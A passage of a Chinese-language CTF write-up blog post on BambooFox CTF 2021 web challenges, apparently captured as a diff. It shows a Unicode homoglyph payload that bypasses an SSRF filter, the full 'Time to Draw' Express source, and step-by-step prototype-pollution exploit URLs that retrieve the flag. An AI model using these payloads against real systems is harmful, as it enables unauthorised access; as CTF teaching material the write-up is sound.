class="keyword">let</span> domain = <span class="string">'the.c0o0o0l-fl444g.server.internal'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(slove(domain));</span><br></pre></td></tr></table></figure>
+
+<h6 id="temp中的对象全部是数组，其中每个key对应的数组表示该key对应的字符可以用数组中的字符来代替，结果如下："><a href="#temp中的对象全部是数组，其中每个key对应的数组表示该key对应的字符可以用数组中的字符来代替，结果如下：" class="headerlink" title="temp中的对象全部是数组，其中每个key对应的数组表示该key对应的字符可以用数组中的字符来代替，结果如下："></a><code>temp</code>中的对象全部是数组，其中每个<code>key</code>对应的数组表示该<code>key</code>对应的字符可以用数组中的字符来代替，结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123; &apos;0&apos;: [ &apos;0&apos;, &apos;⁰&apos;, &apos;₀&apos;, &apos;⓪&apos;, &apos;０&apos; ],</span><br><span class="line">  &apos;4&apos;: [ &apos;4&apos;, &apos;⁴&apos;, &apos;₄&apos;, &apos;④&apos;, &apos;４&apos; ],</span><br><span class="line">  t: [ &apos;T&apos;, &apos;t&apos;, &apos;ᵀ&apos;, &apos;ᵗ&apos;, &apos;ₜ&apos;, &apos;Ⓣ&apos;, &apos;ⓣ&apos;, &apos;Ｔ&apos;, &apos;ｔ&apos; ],</span><br><span class="line">  h:</span><br><span class="line">   [ &apos;H&apos;, &apos;h&apos;, &apos;ʰ&apos;, &apos;ᴴ&apos;, &apos;ₕ&apos;, &apos;ℋ&apos;, &apos;ℌ&apos;, &apos;ℍ&apos;, &apos;ℎ&apos;, &apos;Ⓗ&apos;, &apos;ⓗ&apos;, &apos;Ｈ&apos;, &apos;ｈ&apos; ],</span><br><span class="line">  e:</span><br><span class="line">   [ &apos;E&apos;, &apos;e&apos;, &apos;ᴱ&apos;, &apos;ᵉ&apos;, &apos;ₑ&apos;, &apos;ℯ&apos;, &apos;ℰ&apos;, &apos;ⅇ&apos;, &apos;Ⓔ&apos;, &apos;ⓔ&apos;, &apos;Ｅ&apos;, &apos;ｅ&apos; ],</span><br><span class="line">  &apos;.&apos;: [ &apos;.&apos;, &apos;。&apos;, &apos;．&apos;, &apos;｡&apos; ],</span><br><span class="line">  c: [ &apos;C&apos;, &apos;c&apos;, &apos;ᶜ&apos;, &apos;ℂ&apos;, &apos;ℭ&apos;, &apos;Ⅽ&apos;, &apos;ⅽ&apos;, &apos;Ⓒ&apos;, &apos;ⓒ&apos;, &apos;Ｃ&apos;, &apos;ｃ&apos; ],</span><br><span class="line">  o: [ &apos;O&apos;, &apos;o&apos;, &apos;º&apos;, &apos;ᴼ&apos;, &apos;ᵒ&apos;, &apos;ₒ&apos;, &apos;ℴ&apos;, &apos;Ⓞ&apos;, &apos;ⓞ&apos;, &apos;Ｏ&apos;, &apos;ｏ&apos; ],</span><br><span class="line">  l:</span><br><span class="line">   [ &apos;L&apos;, &apos;l&apos;, &apos;ˡ&apos;, &apos;ᴸ&apos;, &apos;ₗ&apos;, &apos;ℒ&apos;, &apos;ℓ&apos;, &apos;Ⅼ&apos;, &apos;ⅼ&apos;, &apos;Ⓛ&apos;, &apos;ⓛ&apos;, &apos;Ｌ&apos;, &apos;ｌ&apos; ],</span><br><span class="line">  &apos;-&apos;: [ &apos;-&apos;, &apos;﹣&apos;, &apos;－&apos; ],</span><br><span class="line">  f: [ &apos;F&apos;, &apos;f&apos;, &apos;ᶠ&apos;, &apos;ℱ&apos;, &apos;Ⓕ&apos;, &apos;ⓕ&apos;, &apos;Ｆ&apos;, &apos;ｆ&apos; ],</span><br><span class="line">  g: [ &apos;G&apos;, &apos;g&apos;, &apos;ᴳ&apos;, &apos;ᵍ&apos;, &apos;ℊ&apos;, &apos;Ⓖ&apos;, &apos;ⓖ&apos;, &apos;Ｇ&apos;, &apos;ｇ&apos; ],</span><br><span class="line">  s: [ &apos;S&apos;, &apos;s&apos;, &apos;ſ&apos;, &apos;ˢ&apos;, &apos;ₛ&apos;, &apos;Ⓢ&apos;, &apos;ⓢ&apos;, &apos;Ｓ&apos;, &apos;ｓ&apos; ],</span><br><span class="line">  r:</span><br><span class="line">   [ &apos;R&apos;, &apos;r&apos;, &apos;ʳ&apos;, &apos;ᴿ&apos;, &apos;ᵣ&apos;, &apos;ℛ&apos;, &apos;ℜ&apos;, &apos;ℝ&apos;, &apos;Ⓡ&apos;, &apos;ⓡ&apos;, &apos;Ｒ&apos;, &apos;ｒ&apos; ],</span><br><span class="line">  v: [ &apos;V&apos;, &apos;v&apos;, &apos;ᵛ&apos;, &apos;ᵥ&apos;, &apos;Ⅴ&apos;, &apos;ⅴ&apos;, &apos;Ⓥ&apos;, &apos;ⓥ&apos;, &apos;ⱽ&apos;, &apos;Ｖ&apos;, &apos;ｖ&apos; ],</span><br><span class="line">  i:</span><br><span class="line">   [ &apos;I&apos;, &apos;i&apos;, &apos;ᴵ&apos;, &apos;ᵢ&apos;, &apos;ⁱ&apos;, &apos;ℐ&apos;, &apos;ℑ&apos;, &apos;ℹ&apos;, &apos;ⅈ&apos;, &apos;Ⅰ&apos;, &apos;ⅰ&apos;, &apos;Ⓘ&apos;, &apos;ⓘ&apos;, &apos;Ｉ&apos;, &apos;ｉ&apos; ],</span><br><span class="line">  n: [ &apos;N&apos;, &apos;n&apos;, &apos;ᴺ&apos;, &apos;ⁿ&apos;, &apos;ₙ&apos;, &apos;ℕ&apos;, &apos;Ⓝ&apos;, &apos;ⓝ&apos;, &apos;Ｎ&apos;, &apos;ｎ&apos; ],</span><br><span class="line">  a: [ &apos;A&apos;, &apos;a&apos;, &apos;ª&apos;, &apos;ᴬ&apos;, &apos;ᵃ&apos;, &apos;ₐ&apos;, &apos;Ⓐ&apos;, &apos;ⓐ&apos;, &apos;Ａ&apos;, &apos;ａ&apos; ] &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="最后的paylaod："><a href="#最后的paylaod：" class="headerlink" title="最后的paylaod："></a>最后的paylaod：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htTp:ⓣHe｡c0o⓪O₀l-fL4₄⁴g。sErvⒺR.inⓉⓔⓡNaⓛ</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-Time-to-Draw"><a href="#0x03-Time-to-Draw" class="headerlink" title="0x03 Time to Draw"></a>0x03 Time to Draw</h4><h5 id="1-题目源码："><a href="#1-题目源码：" class="headerlink" title="1.题目源码："></a>1.题目源码：</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>)</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> secret = <span class="built_in">require</span>(<span class="string">"./secret"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(cookieParser(secret.FLAG));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> canvas = &#123;</span><br><span class="line">    ...Array(<span class="number">128</span>).fill(<span class="literal">null</span>).map(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">128</span>).fill(<span class="string">"#FFFFFF"</span>))</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hash = <span class="function">(<span class="params">token</span>) =&gt;</span> crypto.createHash(<span class="string">'sha256'</span>).update(token).digest(<span class="string">'hex'</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.signedCookies.user)</span><br><span class="line">        res.cookie(<span class="string">'user'</span>, &#123; <span class="attr">admin</span>: <span class="literal">false</span> &#125;, &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">    res.sendFile(__dirname + <span class="string">"/index.html"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, (_, res) =&gt; &#123;</span><br><span class="line">    res.sendFile(__filename);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/api/canvas'</span>, (_, res) =&gt; &#123;</span><br><span class="line">    res.json(canvas);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/api/draw'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; x, y, color &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (x &amp;&amp; y &amp;&amp; color) canvas[x][y] = color.toString();</span><br><span class="line">    res.json(canvas);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/promote'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.query.yo_i_want_to_be === <span class="string">'admin'</span>)</span><br><span class="line">        res.cookie(<span class="string">'user'</span>, &#123; <span class="attr">admin</span>: <span class="literal">true</span> &#125;, &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    res.send(<span class="string">'Great, you are admin now. &lt;a href="/"&gt;[Keep Drawing]&lt;/a&gt;'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/flag'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> userData = &#123; <span class="attr">isGuest</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (req.signedCookies.user &amp;&amp; req.signedCookies.user.admin === <span class="literal">true</span>) &#123;</span><br><span class="line">        userData.isGuest = <span class="literal">false</span>;</span><br><span class="line">        userData.isAdmin = req.cookies.admin;</span><br><span class="line">        userData.token = secret.ADMIN_TOKEN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.query.token &amp;&amp; req.query.token.match(<span class="regexp">/[0-9a-f]&#123;16&#125;/</span>)</span><br><span class="line">        &amp;&amp; hash(<span class="string">`<span class="subst">$&#123;req.connection.remoteAddress&#125;</span><span class="subst">$&#123;req.query.token&#125;</span>`</span>) === userData.token) &#123;</span><br><span class="line">        res.send(secret.FLAG);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"NO"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-原型链污染回顾："><a href="#2-原型链污染回顾：" class="headerlink" title="2.原型链污染回顾："></a>2.原型链污染回顾：</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str=&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(str.__proto__===<span class="built_in">Object</span>.prototype); <span class="comment">// true</span></span><br><span class="line">str.__proto__.flag=<span class="string">"flag&#123;test&#125;"</span>;</span><br><span class="line"><span class="keyword">const</span> str2=&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(str2.flag); <span class="comment">// flag&#123;test&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="3-分析代码："><a href="#3-分析代码：" class="headerlink" title="3.分析代码："></a>3.分析代码：</h5><h6 id="原型链污染首先关注没有初始化，可控的字段，然后在后面引用过："><a href="#原型链污染首先关注没有初始化，可控的字段，然后在后面引用过：" class="headerlink" title="原型链污染首先关注没有初始化，可控的字段，然后在后面引用过："></a>原型链污染首先关注没有初始化，可控的字段，然后在后面引用过：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-29-BambooFox-CTF-2021-2.PNG" alt></p>
+<h6 id="userData-token在if语句中初始化，但是如果跳过if语句，那么该参数就是没有初始化，而且在后面直接使用。"><a href="#userData-token在if语句中初始化，但是如果跳过if语句，那么该参数就是没有初始化，而且在后面直接使用。" class="headerlink" title="userData.token在if语句中初始化，但是如果跳过if语句，那么该参数就是没有初始化，而且在后面直接使用。"></a><code>userData.token</code>在<code>if</code>语句中初始化，但是如果跳过<code>if</code>语句，那么该参数就是没有初始化，而且在后面直接使用。</h6><h6 id="接下来需要找到可以进行原型链污染的地方："><a href="#接下来需要找到可以进行原型链污染的地方：" class="headerlink" title="接下来需要找到可以进行原型链污染的地方："></a>接下来需要找到可以进行原型链污染的地方：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2021-1-29-BambooFox-CTF-2021-3.PNG" alt></p>
+<h6 id="很明显该处跟我们的示例一样，例如："><a href="#很明显该处跟我们的示例一样，例如：" class="headerlink" title="很明显该处跟我们的示例一样，例如："></a>很明显该处跟我们的示例一样，例如：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> canvas = &#123;</span><br><span class="line">    ...Array(<span class="number">128</span>).fill(<span class="literal">null</span>).map(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">128</span>).fill(<span class="string">"#FFFFFF"</span>))</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;x, y, color&#125; = &#123;<span class="attr">x</span>: <span class="string">'__proto__'</span>, <span class="attr">y</span>: <span class="string">'token'</span>, <span class="attr">color</span>: <span class="string">'my_token'</span>&#125;</span><br><span class="line">canvas[x][y] = color.toString();</span><br><span class="line"><span class="keyword">let</span> temp = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(temp.token) <span class="comment">// my_token</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="最后的payload：-1"><a href="#最后的payload：-1" class="headerlink" title="最后的payload："></a>最后的payload：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> hash = <span class="function">(<span class="params">token</span>) =&gt;</span> crypto.createHash(<span class="string">'sha256'</span>).update(token).digest(<span class="string">'hex'</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">"12345678900000000"</span>;</span><br><span class="line">hostname = <span class="string">"::ffff:127.0.0.1"</span>;</span><br><span class="line">result = hash(hostname + token);</span><br><span class="line"><span class="built_in">console</span>.log(result); <span class="comment">// 0571d35ff568c6faacaa8f931b66729b9bc12a2c1231b8dc8c57073f35c8b62f</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="第一步污染原型链"><a href="#第一步污染原型链" class="headerlink" title="第一步污染原型链"></a>第一步污染原型链</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/api/draw?x=__proto__&amp;y=token&amp;color=1cd6705c4f0df9b640deaa47c5510b7b8b4303acc3bf1e95670e975b889a6ce9</span><br></pre></td></tr></table></figure>
+
+<h6 id="第二步获取flag"><a href="#第二步获取flag" class="headerlink" title="第二步获取flag"></a>第二步获取<code>flag</code></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/flag?token=1234567890000000</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x0n参考链接"><a href="#0x0n参考链接" class="headerlink" title="0x0n参考链接"></a>0x0n参考链接</h4><h6 id="https-spotless-tech-bambooctf-2021-angryface-php-html"><a href="#https-spotless-tech-bambooctf-2021-angryface-php-html" class="headerlink" title="https://spotless.tech/bambooctf-2021-angryface-php.html"></a><a href="https://spotless.tech/bambooctf-2021-angryface-php.html" target="_blank" rel="noopener">https://spotless.tech/bambooctf-2021-angryface-php.html</a></h6><h6 id="https-maxdamage-dev-posts-bctf-ssrfrog-html"><a href="#https-maxdamage-dev-posts-bctf-ssrfrog-html" class="headerlink" title="https://maxdamage.dev/posts/bctf-ssrfrog.html"></a><a href="https://maxdamage.dev/posts/bctf-ssrfrog.html" target="_blank" rel="noopener">https://maxdamage.dev/posts/bctf-ssrfrog.html</a></h6><h6 id="https-github-com-sambrow-ctf-writeups-2021-tree-master-bamboo-fox-ssrfrog"><a href="#https-github-com-sambrow-ctf-writeups-2021-tree-master-bamboo-fox-ssrfrog" class="headerlink" title="https://github.com/sambrow/ctf-writeups-2021/tree/master/bamboo-fox/ssrfrog"></a><a href="https://github.com/sambrow/ctf-writeups-2021/tree/master/bamboo-fox/ssrfrog" target="_blank" rel="noopener">https://github.com/sambrow/ctf-writeups-2021/tree/master/bamboo-fox/ssrfrog</a></h6><h6 id="https-eine-tistory-com-entry-BambooCTF-2021-web-SSRFrog-Time-to-Draw-write-up"><a href="#https-eine-tistory-com-entry-BambooCTF-2021-web-SSRFrog-Time-to-Draw-write-up" class="headerlink" title="https://eine.tistory.com/entry/BambooCTF-2021-web-SSRFrog-Time-to-Draw-write-up"></a><a href="https://eine.tistory.com/entry/BambooCTF-2021-web-SSRFrog-Time-to-Draw-write-up" target="_blank" rel="noopener">https://eine.tistory.com/entry/BambooCTF-2021-web-SSRFrog-Time-to-Draw-write-up</a></h6><h6 id="https-scavengersecurity-com-bamboofox-ctf-2021-time-to-draw-web"><a href="#https-scavengersecurity-com-bamboofox-ctf-2021-time-to-draw-web" class="headerlink" title="https://scavengersecurity.com/bamboofox-ctf-2021-time-to-draw-web/"></a><a href="https://scavengersecurity.com/bamboofox-ctf-2021-time-to-draw-web/" target="_blank" rel="noopener">https://scavengersecurity.com/bamboofox-ctf-2021-time-to-draw-web/</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/01/30/sql注入篇/" rel="next" title="sql注入篇">
+                <i class="fa fa-chevron-left"></i> sql注入篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">51</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-ヽ-Д´-ﾉ"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 ヽ(#`Д´)ﾉ</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目源码如下："><span class="nav-number">1.1.0.1.</span> <span class="nav-text">题目源码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#分析代码可知，我们的输入最终将在eval-中处理，将导致任意命令执行。"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">分析代码可知，我们的输入最终将在eval()中处理，将导致任意命令执行。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接下来我们需要关注三个点："><span class="nav-number">1.1.0.3.</span> <span class="nav-text">接下来我们需要关注三个点：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以把它理解成下面这个代码："><span class="nav-number">1.1.0.4.</span> <span class="nav-text">我们可以把它理解成下面这个代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于使用-GET-来获取参数，根据php的特性我们可以使用一个数组来绕过长度判断和正则表达式，例如："><span class="nav-number">1.1.0.5.</span> <span class="nav-text">由于使用$_GET[]来获取参数，根据php的特性我们可以使用一个数组来绕过长度判断和正则表达式，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在url构造如下："><span class="nav-number">1.1.0.6.</span> <span class="nav-text">在url构造如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#从上图可知构造一个数组的确可以绕过长度和正则表达式限制，但是不能通过eval-print-r-code-1-解析。"><span class="nav-number">1.1.0.7.</span> <span class="nav-text">从上图可知构造一个数组的确可以绕过长度和正则表达式限制，但是不能通过eval(print_r($code,1))解析。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#类比exec-函数我们使用反问号它可以先执行反问号里面的内容，然后抛出错误。尝试在eval-中使用反问号，例如："><span class="nav-number">1.1.0.8.</span> <span class="nav-text">类比exec()函数我们使用反问号它可以先执行反问号里面的内容，然后抛出错误。尝试在eval()中使用反问号，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是显然不成功！"><span class="nav-number">1.1.0.9.</span> <span class="nav-text">但是显然不成功！</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在eval-中注入字符串，来执行shell命令。"><span class="nav-number">1.1.0.10.</span> <span class="nav-text">在eval()中注入字符串，来执行shell命令。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如："><span class="nav-number">1.1.0.11.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#输出如下："><span class="nav-number">1.1.0.12.</span> <span class="nav-text">输出如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PS-上面的-后面的内容全部被注释掉"><span class="nav-number">1.1.0.13.</span> <span class="nav-text">PS:上面的/*后面的内容全部被注释掉</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们构造出payload如下："><span class="nav-number">1.1.0.14.</span> <span class="nav-text">我们构造出payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#输出如下：-1"><span class="nav-number">1.1.0.15.</span> <span class="nav-text">输出如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于Array-的键是错误的，因此上面的代码将不会执行。"><span class="nav-number">1.1.0.16.</span> <span class="nav-text">由于Array()的键是错误的，因此上面的代码将不会执行。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#不过我们可以通过关联数组来构造合法的键值，例如："><span class="nav-number">1.1.0.17.</span> <span class="nav-text">不过我们可以通过关联数组来构造合法的键值，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#输出如下：-2"><span class="nav-number">1.1.0.18.</span> <span class="nav-text">输出如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#虽然它将会解析错误，但是我们将键修改为-SYSTEM，将会解析成功。"><span class="nav-number">1.1.0.19.</span> <span class="nav-text">虽然它将会解析错误，但是我们将键修改为$_SYSTEM，将会解析成功。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#输出如下：-3"><span class="nav-number">1.1.0.20.</span> <span class="nav-text">输出如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的代码将不会解析出错。"><span class="nav-number">1.1.0.21.</span> <span class="nav-text">上面的代码将不会解析出错。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此我们将会得出我们最后的payload："><span class="nav-number">1.1.0.22.</span> <span class="nav-text">因此我们将会得出我们最后的payload：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#输出如下：-4"><span class="nav-number">1.1.0.23.</span> <span class="nav-text">输出如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PS-php7-4是可以的其他版本没试成功，可以使用该条命令下载尝试sudo-apt-install-y-php7-4-php7-4-xdebug。"><span class="nav-number">1.1.0.24.</span> <span class="nav-text">PS:php7.4是可以的其他版本没试成功，可以使用该条命令下载尝试sudo apt install -y php7.4 php7.4-xdebug。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后的payload："><span class="nav-number">1.1.0.25.</span> <span class="nav-text">最后的payload：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法二："><span class="nav-number">1.1.1.</span> <span class="nav-text">方法二：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-SSRFrog"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 SSRFrog</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目提示："><span class="nav-number">1.2.0.1.</span> <span class="nav-text">题目提示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#题目源码如下：-1"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">题目源码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#根据题目提示和源码我们的目标是利用ssrf访问上面提供的地址拿到flag。"><span class="nav-number">1.2.0.3.</span> <span 